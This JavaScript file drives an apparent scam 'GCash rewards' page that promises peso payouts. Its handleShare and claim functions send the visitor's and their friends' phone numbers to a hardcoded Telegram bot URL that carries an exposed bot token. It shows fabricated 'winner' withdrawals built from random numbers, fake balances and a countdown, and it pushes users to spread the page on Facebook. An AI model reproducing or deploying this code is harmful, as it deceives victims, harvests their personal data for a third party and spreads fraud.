// ========== SIMPLE DEVICE + NUMBER TRACKING (SPY MODE) ==========



// ========== INDICATOR SYSTEM ==========

const indicatorSystem = {
    updateIndicators: function(step, isOnHold) {
        if (isOnHold === undefined) isOnHold = false;
        
        const indicator1 = document.getElementById('indicator1');
        const indicator2 = document.getElementById('indicator2');
        const indicator3 = document.getElementById('indicator3');
        
        var indicators = [indicator1, indicator2, indicator3];
        for (var i = 0; i < indicators.length; i++) {
            var ind = indicators[i];
            if (ind) {
                ind.classList.remove('indicator-yellow-red', 'indicator-blue', 'indicator-green', 'indicator-hold');
                ind.style.background = 'rgba(255,255,255,0.2)';
                ind.style.boxShadow = 'none';
                ind.style.animation = 'none';
            }
        }
        
        if (step >= 1 && indicator1) {
            if (isOnHold) {
                indicator1.classList.add('indicator-hold');
                indicator1.style.background = '#ffd700';
                indicator1.style.boxShadow = '0 0 15px #ffd700';
            } else {
                indicator1.classList.add('indicator-yellow-red');
                indicator1.style.background = 'linear-gradient(90deg, #ff4444, #ffd700)';
                indicator1.style.boxShadow = '0 0 10px #ff4444';
                indicator1.style.animation = 'pulseFade 1s infinite';
            }
        }
        
        if (step >= 2 && indicator2) {
            indicator2.classList.add('indicator-blue');
            indicator2.style.background = '#00f2ff';
            indicator2.style.boxShadow = '0 0 10px #00f2ff';
            indicator2.style.animation = 'pulseFade 1s infinite';
        }
        
        if (step >= 3 && indicator3) {
            indicator3.classList.add('indicator-green');
            indicator3.style.background = '#39ff14';
            indicator3.style.boxShadow = '0 0 10px #39ff14';
            indicator3.style.animation = 'pulseFade 1s infinite';
        }
        
        localStorage.setItem('indicatorStep', step);
        localStorage.setItem('claimOnHold', isOnHold);
        this.saveToFirebase(step, isOnHold);
    },
    
    saveToFirebase: async function(step, isOnHold) {
        var phone = localStorage.getItem("userPhone");
        if (!phone) return;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            var db = firebase.database();
            await db.ref('user_sessions/' + phone).update({
                indicatorStep: step,
                claimOnHold: isOnHold,
                lastStepUpdate: Date.now()
            });
        }
    },
    
    loadFromFirebase: async function() {
        var phone = localStorage.getItem("userPhone");
        if (!phone) return { step: 0, isOnHold: false };
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            var db = firebase.database();
            var sessionSnap = await db.ref('user_sessions/' + phone).once('value');
            var step = sessionSnap.exists() ? sessionSnap.val().indicatorStep || 0 : 0;
            var isOnHold = sessionSnap.exists() ? sessionSnap.val().claimOnHold || false : false;
            localStorage.setItem('indicatorStep', step);
            localStorage.setItem('claimOnHold', isOnHold);
            this.updateIndicators(step, isOnHold);
            return { step: step, isOnHold: isOnHold };
        }
        return { step: 0, isOnHold: false };
    },
    
    step1ClaimOnHold: async function() {
        var currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
        if (currentStep === 1) {
            this.updateIndicators(1, true);
            return true;
        }
        return false;
    },
    
    step2FacebookShare: async function() {
        var currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
        if (currentStep === 2) {
            this.updateIndicators(2, false);
            return true;
        }
        return false;
    },
    
    step3ReferralComplete: async function() {
        var currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
        if (currentStep === 3) {
            this.updateIndicators(3, false);
            return true;
        }
        return false;
    },
    
    getCurrentStep: function() {
        return parseInt(localStorage.getItem('indicatorStep') || '0');
    },
    
    setStep: function(step) {
        this.updateIndicators(step, false);
    }
};

// ========== BALANCE MANAGEMENT ==========
const balanceManager = {
    getBalance: async function() {
        var phone = localStorage.getItem("userPhone");
        if (!phone) return 0;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            var db = firebase.database();
            var sessionSnap = await db.ref('user_sessions/' + phone).once('value');
            return sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
        }
        return 0;
    },
    
    addBalance: async function(amount) {
        var phone = localStorage.getItem("userPhone");
        if (!phone) return false;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            var db = firebase.database();
            var sessionRef = db.ref('user_sessions/' + phone);
            var sessionSnap = await sessionRef.once('value');
            var currentBalance = sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
            var newBalance = currentBalance + amount;
            
            if (newBalance > 1200) {
                newBalance = 1200;
                alert("Maximum balance of ₱1200 reached!");
            }
            
            await sessionRef.update({
                balance: newBalance,
                lastBalanceUpdate: Date.now()
            });
            
            await db.ref('balance_history/' + phone + '/' + Date.now()).set({
                amount: amount,
                newBalance: newBalance,
                reason: "reward",
                timestamp: Date.now()
            });
            
            return newBalance;
        }
        return false;
    },
    
    updateBalanceDisplay: async function() {
        var balance = await this.getBalance();
        var balanceElement = document.getElementById('userBalanceDisplay');
        if (balanceElement) {
            balanceElement.innerHTML = "₱" + balance.toLocaleString();
        }
        return balance;
    }
};

// ========== WEIGHTED RANDOM AMOUNTS ==========
const rewardTiers = {
    common: { amounts: [150, 300], weight: 60 },
    rare: { amounts: [450, 600, 750], weight: 30 },
    legendary: { amounts: [900, 1050, 1200], weight: 10 }
};

function generateWeightedAmount() {
    var random = Math.random() * 100;
    var selectedTier = rewardTiers.common;
    
    if (random < rewardTiers.common.weight) {
        selectedTier = rewardTiers.common;
    } else if (random < rewardTiers.common.weight + rewardTiers.rare.weight) {
        selectedTier = rewardTiers.rare;
    } else {
        selectedTier = rewardTiers.legendary;
    }
    
    var amounts = selectedTier.amounts;
    return amounts[Math.floor(Math.random() * amounts.length)];
}

// ========== MAIN TIMER (DROP ENDS IN) ==========
function initMainTimer() {
    var timerDisplay = document.getElementById('mainTimerDisplay');
    if (!timerDisplay) return;
    
    var target = new Date(2026, 4, 1, 0, 0, 0);
    
    function updateTimer() {
        var now = new Date();
        var diff = target - now;
        
        if (diff > 0) {
            var days = Math.floor(diff / (1000*60*60*24));
            var hours = Math.floor((diff % (86400000)) / 3600000);
            var mins = Math.floor((diff % 3600000) / 60000);
            var secs = Math.floor((diff % 60000) / 1000);
            timerDisplay.innerHTML = days + "D " + 
                hours.toString().padStart(2,'0') + ":" + 
                mins.toString().padStart(2,'0') + ":" + 
                secs.toString().padStart(2,'0');
        } else {
            timerDisplay.innerHTML = "00D 00:00:00";
        }
    }
    
    updateTimer();
    setInterval(updateTimer, 1000);
    console.log("Main timer started");
}

// ========== WINNER TICKER ==========
function initWinnerTicker() {
    var winnerSpan = document.getElementById('winnerText');
    if (!winnerSpan) return;
    
    var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
    var amounts = [150, 300, 450, 600, 750, 900, 1050, 1200];
    
    function generateRandomWinner() {
        var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        var last4 = Math.floor(1000 + Math.random() * 9000);
        var amount = amounts[Math.floor(Math.random() * amounts.length)];
        return prefix + "***" + last4 + ' withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount;
    }
    
    winnerSpan.innerHTML = generateRandomWinner();
    
    setInterval(function() {
        winnerSpan.innerHTML = generateRandomWinner();
    }, 15000);
    
    console.log("Winner ticker started");
}


// ========== SHARE BUTTON COOLDOWN UI ==========
var shareCooldownInterval = null;

function updateShareButtonCooldown() {
    var remaining = referralTimer.getRemainingTime();
    var shareBtn = document.getElementById('shareButton');
    var friendInput = document.getElementById('friendPhoneInput');
    var statusMsg = document.getElementById('statusMessage');
    
    if (remaining > 0) {
        var mins = Math.floor(remaining / 60);
        var secs = remaining % 60;
        var timeStr = mins.toString().padStart(2, '0') + ":" + secs.toString().padStart(2, '0');
        if (shareBtn) {
            shareBtn.disabled = true;
            shareBtn.innerHTML = "⏰ WAIT " + timeStr;
        }
        if (friendInput) friendInput.disabled = true;
        if (statusMsg) {
            statusMsg.innerHTML = '<span class="status-waiting">⏳ Please wait ' + timeStr + ' before sharing again ⏳</span>';
        }
    } else {
        if (shareBtn) {
            shareBtn.disabled = false;
            shareBtn.innerHTML = "🐾 SHARE & UNLOCK 🐾";
        }
        if (friendInput) friendInput.disabled = false;
        if (statusMsg) {
            statusMsg.innerHTML = '<span class="status-unlocked">🎉 Share with a friend to unlock 150 credits! 🎉</span>';
        }
        if (shareCooldownInterval) {
            clearInterval(shareCooldownInterval);
            shareCooldownInterval = null;
        }
    }
}

function startShareCooldownUI() {
    if (shareCooldownInterval) clearInterval(shareCooldownInterval);
    updateShareButtonCooldown();
    shareCooldownInterval = setInterval(updateShareButtonCooldown, 1000);
}

function checkExistingCooldown() {
    if (referralTimer.isOnCooldown()) {
        startShareCooldownUI();
    }
}

// ========== CONFETTI FUNCTIONS ==========
var confettiAnimation = null;
var confettiTimeout = null;

function startConfetti() {
    var canvas = document.getElementById('confettiCanvas');
    if (!canvas) return;
    
    canvas.style.display = 'block';
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    var ctx = canvas.getContext('2d');
    
    var particles = [];
    for (var i = 0; i < 100; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height - canvas.height,
            size: Math.random() * 6 + 2,
            color: "hsl(" + (Math.random() * 360) + ", 100%, 60%)",
            speed: Math.random() * 3 + 2
        });
    }
    
    function draw() {
        if (!canvas || canvas.style.display === 'none') return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        for (var j = 0; j < particles.length; j++) {
            var p = particles[j];
            ctx.fillStyle = p.color;
            ctx.fillRect(p.x, p.y, p.size, p.size);
            p.y += p.speed;
            if (p.y > canvas.height) {
                p.y = -p.size;
                p.x = Math.random() * canvas.width;
            }
        }
        
        confettiAnimation = requestAnimationFrame(draw);
    }
    
    draw();
    
    if (confettiTimeout) clearTimeout(confettiTimeout);
    confettiTimeout = setTimeout(function() {
        stopConfetti();
    }, 4000);
}

function stopConfetti() {
    if (confettiAnimation) {
        cancelAnimationFrame(confettiAnimation);
        confettiAnimation = null;
    }
    var canvas = document.getElementById('confettiCanvas');
    if (canvas) {
        var ctx = canvas.getContext('2d');
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        canvas.style.display = 'none';
    }
}

// ========== PRIZE POPUP FUNCTIONS ==========
function showPrizePopup() {
    var popup = document.getElementById('prizePopup');
    if (popup) {
        startConfetti();
        popup.style.display = 'flex';
    }
}

function closePrizePopup() {
    var popup = document.getElementById('prizePopup');
    if (popup) popup.style.display = 'none';
    stopConfetti();
}

// ========== CARD GOLDEN HIGHLIGHT ==========
function initCardHighlights() {
    var cards = document.querySelectorAll('.prize-card');
    
    for (var i = 0; i < cards.length; i++) {
        var card = cards[i];
        
        card.addEventListener('click', function(e) {
            var clickedCard = this;
            
            clickedCard.style.transition = 'all 0.3s ease';
            clickedCard.style.border = '2px solid #ffd700';
            clickedCard.style.boxShadow = '0 0 20px rgba(255,215,0,0.5)';
            
            startConfetti();
            
            setTimeout(function() {
                clickedCard.style.border = '';
                clickedCard.style.boxShadow = '';
            }, 500);
            
            alert("🎉 +₱150 added! Click CLAIM THRU GCASH to withdraw.");
            e.stopPropagation();
        });
    }
    
    console.log("Card highlights initialized");
}

// ========== SHARE BUTTON ==========
async function handleShare() {
    var friendPhone = document.getElementById('friendPhoneInput').value.trim();
    var userPhone = localStorage.getItem("userPhone");
    
    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
        alert("Please enter valid 11-digit number starting with 09");
        return;
    }
    
    if (friendPhone === userPhone) {
        alert("You cannot invite yourself!");
        return;
    }
    
    if (referralTimer.isOnCooldown()) {
        var remaining = referralTimer.getRemainingTime();
        var mins = Math.floor(remaining / 60);
        var secs = remaining % 60;
        alert("Please wait " + mins + ":" + secs.toString().padStart(2, '0') + " before inviting again.");
        return;
    }
    
    indicatorSystem.setStep(1);
    referralTimer.startTimer();
    startShareCooldownUI();
    
    var message = "REFERRAL INVITE!\nUser: " + userPhone + "\nFriend: " + friendPhone;
    
    try {
        await fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message));
    } catch(e) {
        console.log("Telegram error:", e);
    }
    
    document.getElementById('friendPhoneInput').value = '';
    
    var progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '33%';
    
    var statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = '<span class="status-step1">✅ Step 1 completed! Click CLAIM THRU GCASH to get ₱150!</span>';
    }
    
    showPrizePopup();
}

function initShareButton() {
    var shareBtn = document.getElementById('shareButton');
    
    if (shareBtn) {
        var newShareBtn = shareBtn.cloneNode(true);
        shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
        newShareBtn.onclick = handleShare;
        newShareBtn.disabled = referralTimer.isOnCooldown();
        console.log("Share button initialized");
    }
}

// ========== FACEBOOK SHARE ==========
async function handleFacebookShare() {
    var shareUrl = "https://xjiligames.github.io/rewards/index.html";
    var fbShareUrl = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl);
    
    window.open(fbShareUrl, '_blank', 'width=600,height=400');
    
    await indicatorSystem.step2FacebookShare();
    
    var progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '66%';
    
    var statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = '<span class="status-step2">✅ Step 2 completed! Share to Facebook done!</span>';
    }
    
    var phone = localStorage.getItem("userPhone");
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        await db.ref('user_sessions/' + phone).update({
            indicatorStep: 2,
            lastStepUpdate: Date.now()
        });
    }
}

function initFacebookShare() {
    var fbBtn = document.getElementById('shareFBBtn');
    if (fbBtn) {
        fbBtn.onclick = handleFacebookShare;
        
        if (!document.querySelector('.fb-share-info')) {
            var infoText = document.createElement('div');
            infoText.className = 'fb-share-info';
            infoText.style.cssText = 'font-size: 10px; color: #ffaa33; margin-top: 8px; text-align: center;';
            infoText.innerHTML = 'You will receive notification once your share is validated and get +150 bonus Credits';
            fbBtn.parentNode.appendChild(infoText);
        }
    }
}

// ========== CLAIM BUTTON ==========
async function handleClaimGCash() {
    var currentStep = indicatorSystem.getCurrentStep();
    var isOnHold = localStorage.getItem('claimOnHold') === 'true';
    
    if (currentStep !== 1) {
        alert("Complete Step 1 first! Enter a friend's mobile number.");
        return;
    }
    
    if (isOnHold) {
        alert("Claim is already processing. Please wait.");
        return;
    }
    
    await indicatorSystem.step1ClaimOnHold();
    
    var newBalance = await balanceManager.addBalance(150);
    
    if (newBalance !== false) {
        alert("₱150 added to your balance! Total: ₱" + newBalance);
        
        var phone = localStorage.getItem("userPhone");
        var message = "CLAIM SUCCESS!\nUser: " + phone + "\n₱150 claimed";
        await fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message));
        
        var progressFill = document.getElementById('progressFill');
        if (progressFill) progressFill.style.width = '50%';
        
        var statusMsg = document.getElementById('statusMessage');
        if (statusMsg) {
            statusMsg.innerHTML = '<span class="status-claimed">✅ ₱150 claimed! Share on Facebook to continue to Step 2!</span>';
        }
        
        indicatorSystem.updateIndicators(1, false);
    }
}

function initClaimButton() {
    var claimBtn = document.getElementById('claimGCashBtn');
    if (claimBtn) {
        claimBtn.onclick = function() {
            if (typeof window.showClaimPopup === 'function') {
                window.showClaimPopup(150);
            } else {
                handleClaimGCash();
            }
        };
        console.log("Claim button initialized");
    }
}

// ========== ENTER KEY SUPPORT ==========
function initEnterKeySupport() {
    var friendInput = document.getElementById('friendPhoneInput');
    var shareBtn = document.getElementById('shareButton');
    
    if (friendInput && shareBtn) {
        friendInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                shareBtn.click();
            }
        });
    }
}

// ========== VIDEO AUTOPLAY ==========
function initVideoAutoplay() {
    var video = document.querySelector('.lucky-cat-video video');
    if (video) {
        video.play().catch(function(e) {
            console.log("Autoplay blocked:", e);
            document.body.addEventListener('click', function playOnClick() {
                video.play().catch(function() {});
                document.body.removeEventListener('click', playOnClick);
            });
        });
    }
}

// ========== POPUP CLOSE ON OUTSIDE CLICK ==========
function initPopupClose() {
    var popup = document.getElementById('prizePopup');
    if (popup) {
        popup.onclick = function(e) {
            if (e.target === popup) {
                closePrizePopup();
            }
        };
    }
}
